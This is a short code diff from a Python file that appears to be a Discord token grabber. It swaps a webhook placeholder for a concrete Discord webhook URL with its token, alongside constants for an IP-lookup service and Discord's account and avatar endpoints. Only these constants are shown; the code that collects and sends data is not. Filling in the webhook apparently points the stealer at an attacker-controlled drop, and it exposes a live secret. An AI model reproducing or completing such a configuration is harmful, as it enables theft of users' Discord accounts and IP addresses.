@@ -9,7 +9,7 @@ from typing import List, Optional
 from urllib.request import Request, urlopen
 
 # Constants
-WEBHOOK = "{WEBHOOK}"
+WEBHOOK = "{https://discord.com/api/webhooks/1444954870800187413/7gD_V63oZPtzzNuO-IrjokhjHTQpIBaHGBTdJW8hVP6319Rondrel1gnsKpyyjDPyxGT}"
 IPIFY_API_URL = "https://api.ipify.org?format=json"
 DISCORD_API_URL = "https://discordapp.com/api/v6/users/@me"
 DISCORD_AVATAR_URL = "https://cdn.discordapp.com/avatars/{id}/{avatar_id}"
